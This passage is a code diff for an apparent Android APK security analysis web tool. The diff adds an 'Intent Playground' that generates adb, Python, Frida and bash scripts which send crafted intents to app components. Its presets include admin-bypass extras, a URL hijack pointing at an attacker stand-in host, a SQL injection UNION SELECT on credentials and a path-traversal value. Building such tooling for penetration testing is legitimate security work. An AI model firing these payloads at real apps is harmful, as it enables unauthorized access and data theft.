@@ -4,8 +4,8 @@ import { useEffect, useMemo, useRef, useState } from "react";
 import {
   Activity, AlertCircle, Archive, ArrowLeft, ArrowUpRight, Box, Check, CheckCircle2,
   ChevronDown, ChevronRight, Code2, Copy, Cpu, Database, Download, Eye, FileCode, FileCode2, FileText,
-  Folder, GitCompare, Globe, KeyRound, Layers, LayoutDashboard, Link2, Linkedin, Lock, Package, Radar, Radio, Search,
-  Server, Settings, Shield, ShieldAlert, ShieldCheck, Smartphone,
+  Folder, GitCompare, Globe, KeyRound, Layers, LayoutDashboard, Link2, Linkedin, Lock, Package, Play, Plus, Radar, Radio, Search,
+  Send, Server, Settings, Shield, ShieldAlert, ShieldCheck, Smartphone,
   Sparkles, Terminal, Trash2, Upload, X, XCircle, Zap
 } from "lucide-react";
 import LandingPage from "@/components/LandingPage";
@@ -36,6 +36,7 @@ type Tab =
   | "Trackers"
   | "Frida"
   | "ADB"
+  | "IntentPlayground"
   | "OWASP"
   | "Strings"
   | "Signing"
@@ -58,6 +59,7 @@ const tabs: { id: Tab; label: string; icon: React.ReactNode }[] = [
   { id: "Trackers", label: "Trackers & Privacy", icon: <Radar size={16} /> },
   { id: "Frida", label: "Frida Hook Generator", icon: <Terminal size={16} /> },
   { id: "ADB", label: "ADB Exploit Assistant", icon: <Radio size={16} /> },
+  { id: "IntentPlayground", label: "Intent Playground", icon: <Send size={16} /> },
   { id: "OWASP", label: "OWASP Mobile Top 10", icon: <ShieldCheck size={16} /> },
   { id: "Strings", label: "Bytecode Strings", icon: <Search size={16} /> },
   { id: "Signing", label: "Certificate & Signing", icon: <KeyRound size={16} /> },
@@ -89,8 +91,10 @@ export default function APKLens() {
     setError("");
     const f = file ?? inputRef.current?.files?.[0];
     if (!f) return;
-    if (!f.name.toLowerCase().endsWith(".apk")) {
-      setError("Please select a valid .apk file.");
+    const validExts = [".apk", ".aab", ".xapk", ".apks"];
+    const ext = f.name.toLowerCase().slice(f.name.lastIndexOf("."));
+    if (!validExts.includes(ext)) {
+      setError("Please select a valid Android package file (.apk, .aab, .xapk, .apks).");
       return;
     }
     setCurrentFile(f);
@@ -281,7 +285,7 @@ export default function APKLens() {
       <input
         ref={inputRef}
         type="file"
-        accept=".apk,application/vnd.android.package-archive"
+        accept=".apk,.aab,.xapk,.apks,application/vnd.android.package-archive"
         hidden
         onChange={(e) => run(e.target.files?.[0])}
       />
@@ -538,6 +542,7 @@ export default function APKLens() {
               {tab === "Trackers" && <TrackersView analysis={analysis} />}
               {tab === "Frida" && <FridaView analysis={analysis} />}
               {tab === "ADB" && <AdbAssistantView analysis={analysis} />}
+              {tab === "IntentPlayground" && <IntentPlaygroundView analysis={analysis} />}
               {tab === "OWASP" && <OWASPView analysis={analysis} />}
               {tab === "Strings" && <StringSweeperView analysis={analysis} />}
               {tab === "Signing" && <SigningView analysis={analysis} />}
@@ -1531,6 +1536,35 @@ function NativeView({ analysis }: { analysis: APKAnalysis }) {
                 </span>
               </div>
             </div>
+
+            {/* Binary Hardening Mitigations Matrix */}
+            {lib.hardening && (
+              <div style={{ marginTop: "12px", background: "rgba(0,0,0,0.3)", borderRadius: "8px", padding: "10px 12px", border: "1px solid rgba(255,255,255,0.05)" }}>
+                <div style={{ fontSize: "11px", fontWeight: 700, color: "#94a3b8", marginBottom: "8px", textTransform: "uppercase", letterSpacing: "0.05em" }}>
+                  Compiler & Binary Hardening Mitigations:
+                </div>
+                <div style={{ display: "flex", flexWrap: "wrap", gap: "8px" }}>
+                  <span style={{ fontSize: "11px", padding: "3px 8px", borderRadius: "6px", fontWeight: 600, background: lib.hardening.hasPie ? "rgba(52, 211, 153, 0.15)" : "rgba(239, 68, 68, 0.15)", color: lib.hardening.hasPie ? "#34d399" : "#f87171", border: `1px solid ${lib.hardening.hasPie ? "rgba(52, 211, 153, 0.3)" : "rgba(239, 68, 68, 0.3)"}` }}>
+                    PIE: {lib.hardening.hasPie ? "ENABLED" : "DISABLED"}
+                  </span>
+                  <span style={{ fontSize: "11px", padding: "3px 8px", borderRadius: "6px", fontWeight: 600, background: lib.hardening.hasStackCanary ? "rgba(52, 211, 153, 0.15)" : "rgba(245, 158, 11, 0.15)", color: lib.hardening.hasStackCanary ? "#34d399" : "#fbbf24", border: `1px solid ${lib.hardening.hasStackCanary ? "rgba(52, 211, 153, 0.3)" : "rgba(245, 158, 11, 0.3)"}` }}>
+                    CANARY: {lib.hardening.hasStackCanary ? "PROTECTED" : "MISSING"}
+                  </span>
+                  <span style={{ fontSize: "11px", padding: "3px 8px", borderRadius: "6px", fontWeight: 600, background: lib.hardening.hasNxStack ? "rgba(52, 211, 153, 0.15)" : "rgba(239, 68, 68, 0.15)", color: lib.hardening.hasNxStack ? "#34d399" : "#f87171", border: `1px solid ${lib.hardening.hasNxStack ? "rgba(52, 211, 153, 0.3)" : "rgba(239, 68, 68, 0.3)"}` }}>
+                    NX STACK: {lib.hardening.hasNxStack ? "ENABLED" : "EXECUTABLE (RISK)"}
+                  </span>
+                  <span style={{ fontSize: "11px", padding: "3px 8px", borderRadius: "6px", fontWeight: 600, background: lib.hardening.hasRelro ? "rgba(52, 211, 153, 0.15)" : "rgba(245, 158, 11, 0.15)", color: lib.hardening.hasRelro ? "#34d399" : "#fbbf24", border: `1px solid ${lib.hardening.hasRelro ? "rgba(52, 211, 153, 0.3)" : "rgba(245, 158, 11, 0.3)"}` }}>
+                    RELRO: {lib.hardening.hasRelro ? "ENABLED" : "DISABLED"}
+                  </span>
+                  <span style={{ fontSize: "11px", padding: "3px 8px", borderRadius: "6px", fontWeight: 600, background: lib.hardening.hasFortify ? "rgba(52, 211, 153, 0.15)" : "rgba(148, 163, 184, 0.15)", color: lib.hardening.hasFortify ? "#34d399" : "#94a3b8", border: `1px solid ${lib.hardening.hasFortify ? "rgba(52, 211, 153, 0.3)" : "rgba(148, 163, 184, 0.3)"}` }}>
+                    FORTIFY: {lib.hardening.hasFortify ? "YES" : "NO"}
+                  </span>
+                  <span style={{ fontSize: "11px", padding: "3px 8px", borderRadius: "6px", fontWeight: 600, background: !lib.hardening.hasRpath ? "rgba(52, 211, 153, 0.15)" : "rgba(239, 68, 68, 0.15)", color: !lib.hardening.hasRpath ? "#34d399" : "#f87171", border: `1px solid ${!lib.hardening.hasRpath ? "rgba(52, 211, 153, 0.3)" : "rgba(239, 68, 68, 0.3)"}` }}>
+                    RPATH: {!lib.hardening.hasRpath ? "CLEAN" : `INSECURE`}
+                  </span>
+                </div>
+              </div>
+            )}
 
             {/* JNI Exported Functions */}
             {lib.jniFunctions && lib.jniFunctions.length > 0 && (
@@ -3009,6 +3043,762 @@ pause
         ) : (
           <div className="empty">No ADB commands matched your filter criteria.</div>
         )}
+      </div>
+    </div>
+  );
+}
+
+interface ExtraParam {
+  id: string;
+  type: "--es" | "--ez" | "--ei" | "--el" | "--ef" | "--eu";
+  key: string;
+  value: string;
+}
+
+function IntentPlaygroundView({ analysis }: { analysis: APKAnalysis }) {
+  const pkg = analysis.packageName || "com.example.app";
+  const [componentType, setComponentType] = useState<"activity" | "receiver" | "service">("activity");
+  const [selectedComp, setSelectedComp] = useState<string>("");
+  const [customComp, setCustomComp] = useState<string>("");
+  const [action, setAction] = useState<string>("android.intent.action.VIEW");
+  const [dataUri, setDataUri] = useState<string>("");
+  const [mimeType, setMimeType] = useState<string>("");
+  const [selectedCategories, setSelectedCategories] = useState<string[]>([]);
+  const [customCategory, setCustomCategory] = useState<string>("");
+  const [flags, setFlags] = useState<{ [flag: string]: boolean }>({
+    FLAG_ACTIVITY_NEW_TASK: true,
+    FLAG_GRANT_READ_URI_PERMISSION: false,
+    FLAG_GRANT_WRITE_URI_PERMISSION: false,
+    FLAG_ACTIVITY_CLEAR_TOP: false,
+    FLAG_INCLUDE_STOPPED_PACKAGES: false,
+  });
+  const [customFlagHex, setCustomFlagHex] = useState<string>("");
+  const [extras, setExtras] = useState<ExtraParam[]>([
+    { id: "1", type: "--es", key: "auth_token", value: "bypass_token_admin" },
+    { id: "2", type: "--ez", key: "is_admin", value: "true" },
+  ]);
+  const [activeCodeTab, setActiveCodeTab] = useState<"adb" | "python" | "frida" | "bash">("adb");
+  const [copied, setCopied] = useState<boolean>(false);
+
+  const compList = useMemo(() => {
+    if (componentType === "activity") return analysis.activities;
+    if (componentType === "receiver") return analysis.receivers;
+    return analysis.services;
+  }, [componentType, analysis]);
+
+  // Set default selected component when componentType changes
+  useEffect(() => {
+    if (compList.length > 0) {
+      setSelectedComp(compList[0].name);
+    } else {
+      setSelectedComp("__custom__");
+    }
+  }, [componentType, compList]);
+
+  const targetComponent = selectedComp === "__custom__" ? customComp.trim() : selectedComp;
+  const currentCompObj = compList.find((c) => c.name === targetComponent);
+  const isExported = currentCompObj?.exported === "true";
+  const isExplicitlyUnexported = currentCompObj?.exported === "false";
+
+  // Format component name for ADB -n argument
+  const formattedComponent = useMemo(() => {
+    if (!targetComponent) return "";
+    if (targetComponent.includes("/")) return targetComponent;
+    return `${pkg}/${targetComponent}`;
+  }, [pkg, targetComponent]);
+
+  // Build the live ADB shell command
+  const adbCommand = useMemo(() => {
+    const parts: string[] = ["adb shell"];
+
+    if (componentType === "activity") parts.push("am start");
+    else if (componentType === "receiver") parts.push("am broadcast");
+    else parts.push("am startservice");
+
+    if (formattedComponent) parts.push(`-n "${formattedComponent}"`);
+    if (action.trim()) parts.push(`-a ${action.trim()}`);
+    if (dataUri.trim()) parts.push(`-d "${dataUri.trim()}"`);
+    if (mimeType.trim()) parts.push(`-t "${mimeType.trim()}"`);
+
+    selectedCategories.forEach((cat) => parts.push(`-c ${cat}`));
+    if (customCategory.trim()) parts.push(`-c ${customCategory.trim()}`);
+
+    if (flags.FLAG_ACTIVITY_NEW_TASK && componentType === "activity") parts.push("-f 0x10000000");
+    if (flags.FLAG_ACTIVITY_CLEAR_TOP && componentType === "activity") parts.push("-f 0x04000000");
+    if (flags.FLAG_GRANT_READ_URI_PERMISSION) parts.push("--grant-read-uri-permission");
+    if (flags.FLAG_GRANT_WRITE_URI_PERMISSION) parts.push("--grant-write-uri-permission");
+    if (flags.FLAG_INCLUDE_STOPPED_PACKAGES) parts.push("--include-stopped-packages");
+    if (customFlagHex.trim()) parts.push(`-f ${customFlagHex.trim()}`);
+
+    extras.forEach((ext) => {
+      if (ext.key.trim()) {
+        parts.push(`${ext.type} "${ext.key.trim()}" "${ext.value.trim()}"`);
+      }
+    });
+
+    return parts.join(" ");
+  }, [componentType, formattedComponent, action, dataUri, mimeType, selectedCategories, customCategory, flags, customFlagHex, extras]);
+
+  // Build Python Subprocess PoC
+  const pythonPoc = useMemo(() => {
+    return `#!/usr/bin/env python3
+"""
+APKLens Intent Injection PoC
+Target Package: ${pkg}
+Component: ${formattedComponent || "(Unspecified)"}
+"""
+
+import subprocess
+import sys
+
+def execute_intent_payload():
+    cmd = ${JSON.stringify(adbCommand.split(" "))}
+    print("[*] Dispatching crafted Intent to Android ADB...")
+    print(f"[*] Command: {' '.join(cmd)}")
+    try:
+        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
+        print("[+] Intent dispatched successfully!")
+        print(res.stdout)
+    except subprocess.CalledProcessError as err:
+        print(f"[-] Execution failed: {err.stderr}", file=sys.stderr)
+
+if __name__ == "__main__":
+    execute_intent_payload()
+`;
+  }, [pkg, formattedComponent, adbCommand]);
+
+  // Build Frida Intent Script
+  const fridaPoc = useMemo(() => {
+    return `/*
+ * APKLens Frida Dynamic Intent Spoofer
+ * Fires crafted intent directly inside the application's process context.
+ */
+
+Java.perform(function() {
+    var Intent = Java.use("android.content.Intent");
+    var ComponentName = Java.use("android.content.ComponentName");
+    var Uri = Java.use("android.net.Uri");
+    var ActivityThread = Java.use("android.app.ActivityThread");
+    var context = ActivityThread.currentApplication().getApplicationContext();
+
+    var intent = Intent.$new();
+${formattedComponent ? `    intent.setComponent(ComponentName.$new("${pkg}", "${targetComponent}"));\n` : ""}${action ? `    intent.setAction("${action}");\n` : ""}${dataUri ? `    intent.setData(Uri.parse("${dataUri}"));\n` : ""}${mimeType ? `    intent.setType("${mimeType}");\n` : ""}${extras
+      .filter((e) => e.key.trim())
+      .map((e) => {
+        if (e.type === "--ez") return `    intent.putExtra("${e.key}", ${e.value.toLowerCase() === "true"});`;
+        if (e.type === "--ei" || e.type === "--el") return `    intent.putExtra("${e.key}", parseInt("${e.value}"));`;
+        return `    intent.putExtra("${e.key}", "${e.value}");`;
+      })
+      .join("\n")}
+
+    console.log("[+] Firing injected Intent from internal app context...");
+    intent.addFlags(0x10000000); // FLAG_ACTIVITY_NEW_TASK
+    context.startActivity(intent);
+    console.log("[+] Intent successfully delivered.");
+});
+`;
+  }, [pkg, targetComponent, formattedComponent, action, dataUri, mimeType, extras]);
+
+  // Build Shell Script PoC
+  const bashPoc = useMemo(() => {
+    return `#!/usr/bin/env bash
+# APKLens Automated Intent Injection PoC
+# Target: ${pkg}
+
+set -euo pipefail
+
+echo "[*] Checking connected ADB target..."
+adb get-state >/dev/null 2>&1 || { echo "[-] No ADB device authorized or connected"; exit 1; }
+
+echo "[+] Launching crafted Intent:"
+echo "    ${adbCommand}"
+
+${adbCommand}
+
+echo "[+] Execution complete."
+`;
+  }, [pkg, adbCommand]);
+
+  function copyActiveCode() {
+    let text = adbCommand;
+    if (activeCodeTab === "python") text = pythonPoc;
+    else if (activeCodeTab === "frida") text = fridaPoc;
+    else if (activeCodeTab === "bash") text = bashPoc;
+
+    navigator.clipboard.writeText(text);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+  }
+
+  function downloadScript() {
+    const ext = activeCodeTab === "python" ? "py" : activeCodeTab === "frida" ? "js" : "sh";
+    const text = activeCodeTab === "python" ? pythonPoc : activeCodeTab === "frida" ? fridaPoc : bashPoc;
+    const blob = new Blob([text], { type: "text/plain" });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement("a");
+    a.href = url;
+    a.download = `intent_exploit_${(pkg || "app").replace(/[^a-zA-Z0-9]/g, "_")}.${ext}`;
+    a.click();
+    URL.revokeObjectURL(url);
+  }
+
+  function addExtra() {
+    setExtras((prev) => [
+      ...prev,
+      { id: Date.now().toString(), type: "--es", key: "", value: "" },
+    ]);
+  }
+
+  function updateExtra(id: string, field: keyof ExtraParam, val: string) {
+    setExtras((prev) =>
+      prev.map((e) => (e.id === id ? { ...e, [field]: val } : e))
+    );
+  }
+
+  function removeExtra(id: string) {
+    setExtras((prev) => prev.filter((e) => e.id !== id));
+  }
+
+  function applyPreset(presetName: string) {
+    if (presetName === "auth_bypass") {
+      setExtras([
+        { id: "1", type: "--es", key: "user_id", value: "1" },
+        { id: "2", type: "--ez", key: "is_admin", value: "true" },
+        { id: "3", type: "--es", key: "auth_token", value: "mock_jwt_superadmin_bypass" },
+      ]);
+    } else if (presetName === "webview_url") {
+      setAction("android.intent.action.VIEW");
+      setDataUri("https://attacker-payload.example.com/poc.html");
+      setExtras([
+        { id: "1", type: "--es", key: "url", value: "https://attacker-payload.example.com/poc.html" },
+        { id: "2", type: "--ez", key: "enable_js", value: "true" },
+      ]);
+    } else if (presetName === "sql_injection") {
+      setExtras([
+        { id: "1", type: "--es", key: "query", value: "' UNION SELECT username,password FROM credentials--" },
+        { id: "2", type: "--es", key: "file_path", value: "../../../../data/data/" + pkg + "/databases/app.db" },
+      ]);
+    } else if (presetName === "deeplink_first" && analysis.deepLinks.length > 0) {
+      const dl = analysis.deepLinks[0];
+      const built = dl.uri || `${dl.scheme}://${dl.host || ""}${dl.path || ""}`;
+      setAction("android.intent.action.VIEW");
+      setDataUri(built);
+    }
+  }
+
+  return (
+    <div style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
+      {/* Header Banner */}
+      <div className="panel full" style={{ padding: "20px 24px" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: "16px" }}>
+          <div>
+            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "6px" }}>
+              <Send size={22} style={{ color: "#38bdf8" }} />
+              <h2 style={{ fontSize: "18px", fontWeight: 700, color: "#ffffff", margin: 0 }}>
+                Interactive Intent Spoofing & Injection Playground
+              </h2>
+            </div>
+            <p style={{ fontSize: "13px", color: "var(--text-secondary)", margin: 0, maxWidth: "780px" }}>
+              Craft customized Android IPC Intent payloads to test exported activities, broadcast receivers, and background services for authorization bypass, privilege escalation, and parameter tampering.
+            </p>
+          </div>
+
+          <div style={{ display: "flex", gap: "8px", flexWrap: "wrap" }}>
+            <button className="secondary" style={{ fontSize: "11px", padding: "6px 12px" }} onClick={() => applyPreset("auth_bypass")}>
+              <Zap size={13} style={{ color: "#fbbf24" }} /> Preset: Admin Bypass
+            </button>
+            <button className="secondary" style={{ fontSize: "11px", padding: "6px 12px" }} onClick={() => applyPreset("webview_url")}>
+              <Globe size={13} style={{ color: "#38bdf8" }} /> Preset: URL Hijack
+            </button>
+            <button className="secondary" style={{ fontSize: "11px", padding: "6px 12px" }} onClick={() => applyPreset("sql_injection")}>
+              <Database size={13} style={{ color: "#f87171" }} /> Preset: SQL Injection
+            </button>
+            {analysis.deepLinks.length > 0 && (
+              <button className="secondary" style={{ fontSize: "11px", padding: "6px 12px" }} onClick={() => applyPreset("deeplink_first")}>
+                <Link2 size={13} style={{ color: "#34d399" }} /> Preset: Discovered Deep Link
+              </button>
+            )}
+          </div>
+        </div>
+      </div>
+
+      {/* Target Component Selection & Security Status */}
+      <div className="panel full" style={{ padding: "18px 22px" }}>
+        <div style={{ fontSize: "13px", fontWeight: 700, color: "#ffffff", marginBottom: "12px", display: "flex", alignItems: "center", gap: "8px" }}>
+          <span>1. Target Component & IPC Type</span>
+        </div>
+
+        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: "14px" }}>
+          <div>
+            <label style={{ fontSize: "12px", color: "var(--text-muted)", display: "block", marginBottom: "6px" }}>
+              IPC Component Type
+            </label>
+            <div style={{ display: "flex", gap: "8px" }}>
+              {(["activity", "receiver", "service"] as const).map((t) => (
+                <button
+                  key={t}
+                  className="secondary"
+                  style={{
+                    flex: 1,
+                    padding: "7px 10px",
+                    fontSize: "12px",
+                    textTransform: "capitalize",
+                    background: componentType === t ? "rgba(56, 189, 248, 0.2)" : undefined,
+                    borderColor: componentType === t ? "rgba(56, 189, 248, 0.5)" : undefined,
+                    color: componentType === t ? "#38bdf8" : undefined,
+                  }}
+                  onClick={() => setComponentType(t)}
+                >
+                  {t}
+                </button>
+              ))}
+            </div>
+          </div>
+
+          <div>
+            <label style={{ fontSize: "12px", color: "var(--text-muted)", display: "block", marginBottom: "6px" }}>
+              Discovered {componentType.toUpperCase()} ({compList.length} in Manifest)
+            </label>
+            <select
+              style={{
+                width: "100%",
+                padding: "8px 12px",
+                borderRadius: "8px",
+                background: "rgba(0,0,0,0.3)",
+                border: "1px solid var(--border-glass)",
+                color: "#ffffff",
+                fontSize: "12px",
+                fontFamily: "var(--font-mono)",
+              }}
+              value={selectedComp}
+              onChange={(e) => setSelectedComp(e.target.value)}
+            >
+              {compList.map((c) => (
+                <option key={c.name} value={c.name} style={{ background: "#0a0f1d", color: "#ffffff" }}>
+                  {c.name} {c.exported === "true" ? "[EXPORTED]" : c.exported === "false" ? "[UNEXPORTED]" : "[DEFAULT]"}
+                </option>
+              ))}
+              <option value="__custom__" style={{ background: "#0a0f1d", color: "#38bdf8" }}>
+                + Custom / Manual Component Entry
+              </option>
+            </select>
+          </div>
+        </div>
+
+        {selectedComp === "__custom__" && (
+          <div style={{ marginTop: "12px" }}>
+            <label style={{ fontSize: "12px", color: "var(--text-muted)", display: "block", marginBottom: "6px" }}>
+              Custom Target Component (e.g. {pkg}/.MainActivity)
+            </label>
+            <input
+              type="text"
+              placeholder={`${pkg}/.MyTargetActivity`}
+              value={customComp}
+              onChange={(e) => setCustomComp(e.target.value)}
+              style={{
+                width: "100%",
+                padding: "8px 12px",
+                borderRadius: "8px",
+                background: "rgba(0,0,0,0.3)",
+                border: "1px solid var(--border-glass)",
+                color: "#ffffff",
+                fontSize: "12px",
+                fontFamily: "var(--font-mono)",
+              }}
+            />
+          </div>
+        )}
+
+        {/* Security Assessment Badge */}
+        <div style={{ marginTop: "14px" }}>
+          {isExported ? (
+            <div style={{ display: "flex", alignItems: "center", gap: "8px", padding: "8px 12px", borderRadius: "6px", background: "rgba(239, 68, 68, 0.15)", border: "1px solid rgba(239, 68, 68, 0.3)", color: "#f87171", fontSize: "12px" }}>
+              <ShieldAlert size={16} />
+              <span>
+                <strong>CRITICAL EXPOSURE:</strong> This component is declared with <code>android:exported="true"</code>. It is accessible by any app installed on the device or via standard ADB commands without elevated root privileges.
+              </span>
+            </div>
+          ) : isExplicitlyUnexported ? (
+            <div style={{ display: "flex", alignItems: "center", gap: "8px", padding: "8px 12px", borderRadius: "6px", background: "rgba(52, 211, 153, 0.15)", border: "1px solid rgba(52, 211, 153, 0.3)", color: "#34d399", fontSize: "12px" }}>
+              <ShieldCheck size={16} />
+              <span>
+                <strong>PROTECTED (UNEXPORTED):</strong> This component has <code>android:exported="false"</code>. Dispatched intents from external apps will trigger a <code>SecurityException</code> unless dispatched via root ADB shell (<code>su</code>).
+              </span>
+            </div>
+          ) : (
+            <div style={{ display: "flex", alignItems: "center", gap: "8px", padding: "8px 12px", borderRadius: "6px", background: "rgba(245, 158, 11, 0.15)", border: "1px solid rgba(245, 158, 11, 0.3)", color: "#fbbf24", fontSize: "12px" }}>
+              <AlertCircle size={16} />
+              <span>
+                <strong>IMPLICIT EXPORT STATUS:</strong> No explicit <code>android:exported</code> attribute found. On Android 12+, manifest entries with intent filters require explicit export declaration.
+              </span>
+            </div>
+          )}
+        </div>
+      </div>
+
+      {/* Action, Data URI, MIME & Categories */}
+      <div className="panel full" style={{ padding: "18px 22px" }}>
+        <div style={{ fontSize: "13px", fontWeight: 700, color: "#ffffff", marginBottom: "12px" }}>
+          2. Intent Action, URI & MIME Configuration
+        </div>
+
+        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: "14px" }}>
+          <div>
+            <label style={{ fontSize: "12px", color: "var(--text-muted)", display: "block", marginBottom: "6px" }}>
+              Intent Action (<code>-a</code>)
+            </label>
+            <input
+              type="text"
+              placeholder="android.intent.action.VIEW"
+              value={action}
+              onChange={(e) => setAction(e.target.value)}
+              style={{
+                width: "100%",
+                padding: "8px 12px",
+                borderRadius: "8px",
+                background: "rgba(0,0,0,0.3)",
+                border: "1px solid var(--border-glass)",
+                color: "#ffffff",
+                fontSize: "12px",
+                fontFamily: "var(--font-mono)",
+              }}
+            />
+            <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", marginTop: "6px" }}>
+              {["android.intent.action.VIEW", "android.intent.action.MAIN", "android.intent.action.SEND", "android.intent.action.BOOT_COMPLETED"].map((act) => (
+                <button
+                  key={act}
+                  className="secondary"
+                  style={{ fontSize: "10px", padding: "2px 6px" }}
+                  onClick={() => setAction(act)}
+                >
+                  {act.split(".").pop()}
+                </button>
+              ))}
+            </div>
+          </div>
+
+          <div>
+            <label style={{ fontSize: "12px", color: "var(--text-muted)", display: "block", marginBottom: "6px" }}>
+              Data URI (<code>-d</code>)
+            </label>
+            <input
+              type="text"
+              placeholder="content://contacts/people/1 or https://target..."
+              value={dataUri}
+              onChange={(e) => setDataUri(e.target.value)}
+              style={{
+                width: "100%",
+                padding: "8px 12px",
+                borderRadius: "8px",
+                background: "rgba(0,0,0,0.3)",
+                border: "1px solid var(--border-glass)",
+                color: "#ffffff",
+                fontSize: "12px",
+                fontFamily: "var(--font-mono)",
+              }}
+            />
+            {analysis.deepLinks.length > 0 && (
+              <div style={{ display: "flex", gap: "6px", flexWrap: "wrap", marginTop: "6px" }}>
+                {analysis.deepLinks.slice(0, 3).map((dl, idx) => {
+                  const u = dl.uri || `${dl.scheme}://${dl.host || ""}${dl.path || ""}`;
+                  return (
+                    <button
+                      key={idx}
+                      className="secondary"
+                      style={{ fontSize: "10px", padding: "2px 6px", color: "#38bdf8" }}
+                      onClick={() => setDataUri(u)}
+                    >
+                      {u}
+                    </button>
+                  );
+                })}
+              </div>
+            )}
+          </div>
+
+          <div>
+            <label style={{ fontSize: "12px", color: "var(--text-muted)", display: "block", marginBottom: "6px" }}>
+              MIME Type (<code>-t</code>)
+            </label>
+            <input
+              type="text"
+              placeholder="text/plain or application/octet-stream"
+              value={mimeType}
+              onChange={(e) => setMimeType(e.target.value)}
+              style={{
+                width: "100%",
+                padding: "8px 12px",
+                borderRadius: "8px",
+                background: "rgba(0,0,0,0.3)",
+                border: "1px solid var(--border-glass)",
+                color: "#ffffff",
+                fontSize: "12px",
+                fontFamily: "var(--font-mono)",
+              }}
+            />
+          </div>
+        </div>
+
+        {/* Intent Categories */}
+        <div style={{ marginTop: "14px" }}>
+          <label style={{ fontSize: "12px", color: "var(--text-muted)", display: "block", marginBottom: "6px" }}>
+            Intent Categories (<code>-c</code>)
+          </label>
+          <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
+            {["android.intent.category.DEFAULT", "android.intent.category.BROWSABLE", "android.intent.category.LAUNCHER"].map((cat) => {
+              const active = selectedCategories.includes(cat);
+              return (
+                <button
+                  key={cat}
+                  className="secondary"
+                  style={{
+                    padding: "4px 10px",
+                    fontSize: "11px",
+                    background: active ? "rgba(56, 189, 248, 0.2)" : undefined,
+                    borderColor: active ? "rgba(56, 189, 248, 0.5)" : undefined,
+                    color: active ? "#38bdf8" : undefined,
+                  }}
+                  onClick={() => {
+                    if (active) setSelectedCategories(selectedCategories.filter((c) => c !== cat));
+                    else setSelectedCategories([...selectedCategories, cat]);
+                  }}
+                >
+                  {cat.split(".").pop()}
+                </button>
+              );
+            })}
+            <input
+              type="text"
+              placeholder="Custom category..."
+              value={customCategory}
+              onChange={(e) => setCustomCategory(e.target.value)}
+              style={{
+                padding: "4px 8px",
+                borderRadius: "6px",
+                background: "rgba(0,0,0,0.3)",
+                border: "1px solid var(--border-glass)",
+                color: "#ffffff",
+                fontSize: "11px",
+                fontFamily: "var(--font-mono)",
+                width: "180px",
+              }}
+            />
+          </div>
+        </div>
+
+        {/* Intent Flags */}
+        <div style={{ marginTop: "14px" }}>
+          <label style={{ fontSize: "12px", color: "var(--text-muted)", display: "block", marginBottom: "6px" }}>
+            Intent Flags & Permissions (<code>-f</code> / <code>--grant</code>)
+          </label>
+          <div style={{ display: "flex", gap: "12px", flexWrap: "wrap" }}>
+            {Object.keys(flags).map((k) => (
+              <label key={k} style={{ display: "flex", alignItems: "center", gap: "6px", fontSize: "11px", color: "#cbd5e1", cursor: "pointer" }}>
+                <input
+                  type="checkbox"
+                  checked={flags[k]}
+                  onChange={(e) => setFlags({ ...flags, [k]: e.target.checked })}
+                />
+                <span>{k}</span>
+              </label>
+            ))}
+            <input
+              type="text"
+              placeholder="Custom hex flag (e.g. 0x10000000)"
+              value={customFlagHex}
+              onChange={(e) => setCustomFlagHex(e.target.value)}
+              style={{
+                padding: "2px 8px",
+                borderRadius: "6px",
+                background: "rgba(0,0,0,0.3)",
+                border: "1px solid var(--border-glass)",
+                color: "#ffffff",
+                fontSize: "11px",
+                fontFamily: "var(--font-mono)",
+                width: "160px",
+              }}
+            />
+          </div>
+        </div>
+      </div>
+
+      {/* Extra Key-Value Injection Parameters */}
+      <div className="panel full" style={{ padding: "18px 22px" }}>
+        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "12px" }}>
+          <div style={{ fontSize: "13px", fontWeight: 700, color: "#ffffff" }}>
+            3. Dynamic Intent Extra Parameters ({extras.length})
+          </div>
+          <button className="secondary" style={{ fontSize: "11px", padding: "5px 10px" }} onClick={addExtra}>
+            <Plus size={13} /> Add Extra Parameter
+          </button>
+        </div>
+
+        <div style={{ display: "flex", flexDirection: "column", gap: "8px" }}>
+          {extras.map((ext) => (
+            <div key={ext.id} style={{ display: "flex", gap: "8px", alignItems: "center" }}>
+              <select
+                value={ext.type}
+                onChange={(e) => updateExtra(ext.id, "type", e.target.value as any)}
+                style={{
+                  padding: "6px 8px",
+                  borderRadius: "6px",
+                  background: "rgba(0,0,0,0.4)",
+                  border: "1px solid var(--border-glass)",
+                  color: "#38bdf8",
+                  fontSize: "11px",
+                  fontFamily: "var(--font-mono)",
+                  width: "140px",
+                }}
+              >
+                <option value="--es">String (--es)</option>
+                <option value="--ez">Boolean (--ez)</option>
+                <option value="--ei">Integer (--ei)</option>
+                <option value="--el">Long (--el)</option>
+                <option value="--ef">Float (--ef)</option>
+                <option value="--eu">URI (--eu)</option>
+              </select>
+
+              <input
+                type="text"
+                placeholder="Parameter Key (e.g. auth_token)"
+                value={ext.key}
+                onChange={(e) => updateExtra(ext.id, "key", e.target.value)}
+                style={{
+                  flex: 1,
+                  padding: "6px 10px",
+                  borderRadius: "6px",
+                  background: "rgba(0,0,0,0.3)",
+                  border: "1px solid var(--border-glass)",
+                  color: "#ffffff",
+                  fontSize: "12px",
+                  fontFamily: "var(--font-mono)",
+                }}
+              />
+
+              <input
+                type="text"
+                placeholder="Parameter Value"
+                value={ext.value}
+                onChange={(e) => updateExtra(ext.id, "value", e.target.value)}
+                style={{
+                  flex: 1,
+                  padding: "6px 10px",
+                  borderRadius: "6px",
+                  background: "rgba(0,0,0,0.3)",
+                  border: "1px solid var(--border-glass)",
+                  color: "#ffffff",
+                  fontSize: "12px",
+                  fontFamily: "var(--font-mono)",
+                }}
+              />
+
+              <button
+                className="secondary"
+                style={{ padding: "6px 8px", color: "#f87171" }}
+                onClick={() => removeExtra(ext.id)}
+                title="Remove parameter"
+              >
+                <Trash2 size={13} />
+              </button>
+            </div>
+          ))}
+          {extras.length === 0 && (
